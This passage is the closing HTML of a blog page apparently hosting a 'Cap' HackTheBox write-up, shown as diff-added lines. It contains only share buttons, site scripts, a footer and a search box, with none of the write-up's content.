+      class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
+      href="https://twitter.com/intent/tweet/?url=/writeups/hackthebox/cap/&amp;text=Cap%20Writeup%20-%20HackTheBox"
+      title="Tweet on Twitter"
+      aria-label="Tweet on Twitter"
+      >
+      
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M389.2 48h70.6L305.6 224.2 487 464H345L233.7 318.6 106.5 464H35.8L200.7 275.5 26.8 48H172.4L272.9 180.9 389.2 48zM364.4 421.8h39.1L151.1 88h-42L364.4 421.8z"/></svg>
+  </span>
+
+
+    </a>
+      
+    
+      
+      <a
+      target="_blank"
+      class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
+      href="https://api.whatsapp.com/send?text=/writeups/hackthebox/cap/&amp;resubmit=true&amp;title=Cap%20Writeup%20-%20HackTheBox"
+      title=""
+      aria-label=""
+      >
+      
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentColor" d="M380.9 97.1C339 55.1 283.2 32 223.9 32c-122.4 0-222 99.6-222 222 0 39.1 10.2 77.3 29.6 111L0 480l117.7-30.9c32.4 17.7 68.9 27 106.1 27h.1c122.3 0 224.1-99.6 224.1-222 0-59.3-25.2-115-67.1-157zm-157 341.6c-33.2 0-65.7-8.9-94-25.7l-6.7-4-69.8 18.3L72 359.2l-4.4-7c-18.5-29.4-28.2-63.3-28.2-98.2 0-101.7 82.8-184.5 184.6-184.5 49.3 0 95.6 19.2 130.4 54.1 34.8 34.9 56.2 81.2 56.1 130.5 0 101.8-84.9 184.6-186.6 184.6zm101.2-138.2c-5.5-2.8-32.8-16.2-37.9-18-5.1-1.9-8.8-2.8-12.5 2.8-3.7 5.6-14.3 18-17.6 21.8-3.2 3.7-6.5 4.2-12 1.4-32.6-16.3-54-29.1-75.5-66-5.7-9.8 5.7-9.1 16.3-30.3 1.8-3.7.9-6.9-.5-9.7-1.4-2.8-12.5-30.1-17.1-41.2-4.5-10.8-9.1-9.3-12.5-9.5-3.2-.2-6.9-.2-10.6-.2-3.7 0-9.7 1.4-14.8 6.9-5.1 5.6-19.4 19-19.4 46.3 0 27.3 19.9 53.7 22.6 57.4 2.8 3.7 39.1 59.7 94.8 83.8 35.2 15.2 49 16.5 66.6 13.9 10.7-1.6 32.8-13.4 37.4-26.4 4.6-13 4.6-24.1 3.2-26.4-1.3-2.5-5-3.9-10.5-6.6z"/></svg>
+
+  </span>
+
+
+    </a>
+      
+    
+      
+      <a
+      target="_blank"
+      class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
+      href="https://t.me/share/url?url=/writeups/hackthebox/cap/&amp;resubmit=true&amp;title=Cap%20Writeup%20-%20HackTheBox"
+      title=""
+      aria-label=""
+      >
+      
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><path fill="currentColor" d="M248,8C111.033,8,0,119.033,0,256S111.033,504,248,504,496,392.967,496,256,384.967,8,248,8ZM362.952,176.66c-3.732,39.215-19.881,134.378-28.1,178.3-3.476,18.584-10.322,24.816-16.948,25.425-14.4,1.326-25.338-9.517-39.287-18.661-21.827-14.308-34.158-23.215-55.346-37.177-24.485-16.135-8.612-25,5.342-39.5,3.652-3.793,67.107-61.51,68.335-66.746.153-.655.3-3.1-1.154-4.384s-3.59-.849-5.135-.5q-3.283.746-104.608,69.142-14.845,10.194-26.894,9.934c-8.855-.191-25.888-5.006-38.551-9.123-15.531-5.048-27.875-7.717-26.8-16.291q.84-6.7,18.45-13.7,108.446-47.248,144.628-62.3c68.872-28.647,83.183-33.623,92.511-33.789,2.052-.034,6.639.474,9.61,2.885a10.452,10.452,0,0,1,3.53,6.716A43.765,43.765,0,0,1,362.952,176.66Z"/></svg>
+
+  </span>
+
+
+    </a>
+      
+    
+      
+      <a
+      target="_blank"
+      class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
+      href="https://pinterest.com/pin/create/bookmarklet/?url=/writeups/hackthebox/cap/&amp;description=Cap%20Writeup%20-%20HackTheBox"
+      title="Pin on Pinterest"
+      aria-label="Pin on Pinterest"
+      >
+      
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><path fill="currentColor" d="M496 256c0 137-111 248-248 248-25.6 0-50.2-3.9-73.4-11.1 10.1-16.5 25.2-43.5 30.8-65 3-11.6 15.4-59 15.4-59 8.1 15.4 31.7 28.5 56.8 28.5 74.8 0 128.7-68.8 128.7-154.3 0-81.9-66.9-143.2-152.9-143.2-107 0-163.9 71.8-163.9 150.1 0 36.4 19.4 81.7 50.3 96.1 4.7 2.2 7.2 1.2 8.3-3.3.8-3.4 5-20.3 6.9-28.1.6-2.5.3-4.7-1.7-7.1-10.1-12.5-18.3-35.3-18.3-56.6 0-54.7 41.4-107.6 112-107.6 60.9 0 103.6 41.5 103.6 100.9 0 67.1-33.9 113.6-78 113.6-24.3 0-42.6-20.1-36.7-44.8 7-29.5 20.5-61.3 20.5-82.6 0-19-10.2-34.9-31.4-34.9-24.9 0-44.9 25.7-44.9 60.2 0 22 7.4 36.8 7.4 36.8s-24.5 103.8-29 123.2c-5 21.4-3 51.6-.9 71.2C65.4 450.9 0 361.1 0 256 0 119 111 8 248 8s248 111 248 248z"/></svg>
+
+  </span>
+
+
+    </a>
+      
+    
+      
+      <a
+      target="_blank"
+      class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
+      href="https://reddit.com/submit/?url=/writeups/hackthebox/cap/&amp;resubmit=true&amp;title=Cap%20Writeup%20-%20HackTheBox"
+      title="Submit to Reddit"
+      aria-label="Submit to Reddit"
+      >
+      
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M201.5 305.5c-13.8 0-24.9-11.1-24.9-24.6 0-13.8 11.1-24.9 24.9-24.9 13.6 0 24.6 11.1 24.6 24.9 0 13.6-11.1 24.6-24.6 24.6zM504 256c0 137-111 248-248 248S8 393 8 256 119 8 256 8s248 111 248 248zm-132.3-41.2c-9.4 0-17.7 3.9-23.8 10-22.4-15.5-52.6-25.5-86.1-26.6l17.4-78.3 55.4 12.5c0 13.6 11.1 24.6 24.6 24.6 13.8 0 24.9-11.3 24.9-24.9s-11.1-24.9-24.9-24.9c-9.7 0-18 5.8-22.1 13.8l-61.2-13.6c-3-.8-6.1 1.4-6.9 4.4l-19.1 86.4c-33.2 1.4-63.1 11.3-85.5 26.8-6.1-6.4-14.7-10.2-24.1-10.2-34.9 0-46.3 46.9-14.4 62.8-1.1 5-1.7 10.2-1.7 15.5 0 52.6 59.2 95.2 132 95.2 73.1 0 132.3-42.6 132.3-95.2 0-5.3-.6-10.8-1.9-15.8 31.3-16 19.8-62.5-14.9-62.5zM302.8 331c-18.2 18.2-76.1 17.9-93.6 0-2.2-2.2-6.1-2.2-8.3 0-2.5 2.5-2.5 6.4 0 8.6 22.8 22.8 87.3 22.8 110.2 0 2.5-2.2 2.5-6.1 0-8.6-2.2-2.2-6.1-2.2-8.3 0zm7.7-75c-13.6 0-24.6 11.1-24.6 24.9 0 13.6 11.1 24.6 24.6 24.6 13.8 0 24.9-11.1 24.9-24.6 0-13.8-11-24.9-24.9-24.9z"/></svg>
+
+  </span>
+
+
+    </a>
+      
+    
+      
+      <a
+      target="_blank"
+      class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
+      href="https://www.facebook.com/sharer/sharer.php?u=/writeups/hackthebox/cap/&amp;quote=Cap%20Writeup%20-%20HackTheBox"
+      title="Share on Facebook"
+      aria-label="Share on Facebook"
+      >
+      
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M504 256C504 119 393 8 256 8S8 119 8 256c0 123.78 90.69 226.38 209.25 245V327.69h-63V256h63v-54.64c0-62.15 37-96.48 93.67-96.48 27.14 0 55.52 4.84 55.52 4.84v61h-31.28c-30.8 0-40.41 19.12-40.41 38.73V256h68.78l-11 71.69h-57.78V501C413.31 482.38 504 379.78 504 256z"/></svg>
+
+  </span>
+
+
+    </a>
+      
+    
+      
+      <a
+      target="_blank"
+      class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
+      href="mailto:?body=/writeups/hackthebox/cap/&amp;subject=Cap%20Writeup%20-%20HackTheBox"
+      title="Send via email"
+      aria-label="Send via email"
+      >
+      
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M207.8 20.73c-93.45 18.32-168.7 93.66-187 187.1c-27.64 140.9 68.65 266.2 199.1 285.1c19.01 2.888 36.17-12.26 36.17-31.49l.0001-.6631c0-15.74-11.44-28.88-26.84-31.24c-84.35-12.98-149.2-86.13-149.2-174.2c0-102.9 88.61-185.5 193.4-175.4c91.54 8.869 158.6 91.25 158.6 183.2l0 16.16c0 22.09-17.94 40.05-40 40.05s-40.01-17.96-40.01-40.05v-120.1c0-8.847-7.161-16.02-16.01-16.02l-31.98 .0036c-7.299 0-13.2 4.992-15.12 11.68c-24.85-12.15-54.24-16.38-86.06-5.106c-38.75 13.73-68.12 48.91-73.72 89.64c-9.483 69.01 43.81 128 110.9 128c26.44 0 50.43-9.544 69.59-24.88c24 31.3 65.23 48.69 109.4 37.49C465.2 369.3 496 324.1 495.1 277.2V256.3C495.1 107.1 361.2-9.332 207.8 20.73zM239.1 304.3c-26.47 0-48-21.56-48-48.05s21.53-48.05 48-48.05s48 21.56 48 48.05S266.5 304.3 239.1 304.3z"/></svg>
+
+  </span>
+
+
+    </a>
+      
+    
+  </section>
+
+
+          
+      </div>
+     
+      
+      
+        
+        
+      <script>
+        var oid = "views_writeups\/HackTheBox\/CAP\/index..md"
+        var oid_likes = "likes_writeups\/HackTheBox\/CAP\/index..md"
+      </script>
+      
+      
+      
+      <script type="text/javascript" src="/js/page.min.b06a29d42a4ed16787978e2eee1e8c797b7698db2bc14ccee78f5c80ac566fc996190a73ad80a5e987558474b20b96fa38f7d85b405f165ff72b7b163c5ad11b.js" integrity="sha512-sGop1CpO0WeHl44u7h6MeXt2mNsrwUzO549cgKxWb8mWGQpzrYCl6YdVhHSyC5b6OPfYW0BfFl/3K3sWPFrRGw=="></script>
+  
+    </section>
+  <footer class="pt-8 max-w-prose print:hidden">
+
+    
+  
+
+
+    
+  </footer>
+</article>
+
+      <div id="top-scroller" class="pointer-events-none absolute top-[110vh] bottom-0 w-12 ltr:right-0 rtl:left-0">
+  <a href="#the-top"
+    class="pointer-events-auto sticky top-[calc(100vh-5.5rem)] flex h-12 w-12 mb-16 items-center justify-center rounded-full bg-neutral/50 text-xl text-neutral-700 hover:text-primary-600 dark:bg-neutral-800/50 dark:text-neutral dark:hover:text-primary-400"
+    aria-label="Scroll to top" title="Scroll to top">
+    &uarr;
+  </a>
+</div>
+    </main><footer id="site-footer" class="py-10 print:hidden">
+  
+  
+    
+  
+  <div class="flex items-center justify-between">
+
+    
+    
+    <p class="text-sm text-neutral-500 dark:text-neutral-400">
+      © 2025 DarknessE1
+    </p>
+    
+
+    
+    
+
+  </div>
+  <script>
+    
+    mediumZoom(document.querySelectorAll("img:not(.nozoom)"), {
+      margin: 24,
+      background: 'rgba(0,0,0,0.5)',
+      scrollOffset: 0,
+    })
+    
+  </script>
+  
+  
+  <script type="text/javascript" src="/js/process.min.62060bb247f4de2b6dde45903668fefb68d792f365587605177b1227c0cf43588701edaca0cb40e2c8e2789bd5ce67c1d2a215b9fb258c3496a7cd25e7cb5fdf.js" integrity="sha512-YgYLskf03itt3kWQNmj&#43;&#43;2jXkvNlWHYFF3sSJ8DPQ1iHAe2soMtA4sjieJvVzmfB0qIVufsljDSWp80l58tf3w=="></script>
+  
+  
+</footer>
+<div
+  id="search-wrapper"
+  class="invisible fixed inset-0 flex h-screen w-screen cursor-default flex-col bg-neutral-500/50 p-4 backdrop-blur-sm dark:bg-neutral-900/50 sm:p-6 md:p-[10vh] lg:p-[12vh]"
+  data-url=""
+  style="z-index:500"
+>
+  <div
+    id="search-modal"
+    class="flex flex-col w-full max-w-3xl min-h-0 mx-auto border rounded-md shadow-lg top-20 border-neutral-200 bg-neutral dark:border-neutral-700 dark:bg-neutral-800"
+  >
+    <header class="relative z-10 flex items-center justify-between flex-none px-2">
+      <form class="flex items-center flex-auto min-w-0">
+        <div class="flex items-center justify-center w-8 h-8 text-neutral-400">
+          
+
+  <span class="relative block icon">
+    <svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
+
+  </span>
+
+
+        </div>
+        <input
+          type="search"
+          id="search-query"
+          class="flex flex-auto h-12 mx-1 bg-transparent appearance-none focus:outline-dotted focus:outline-2 focus:outline-transparent"
+          placeholder="Search"
+          tabindex="0"
+        />
+      </form>
+      <button
+        id="close-search-button"
+        class="flex items-center justify-center w-8 h-8 text-neutral-700 hover:text-primary-600 dark:text-neutral dark:hover:text-primary-400"
+        title="Close (Esc)"
+      >
+        
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75 0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3L54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75 0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-105.4 105.4L310.6 361.4z"/></svg>
+
+  </span>
+
+
+      </button>
+    </header>
+    <section class="flex-auto px-2 overflow-auto">
+      <ul id="search-results">
+        
+      </ul>
+    </section>
+  </div>
+</div>
+
+  </div>
+</body>
+
+</html>
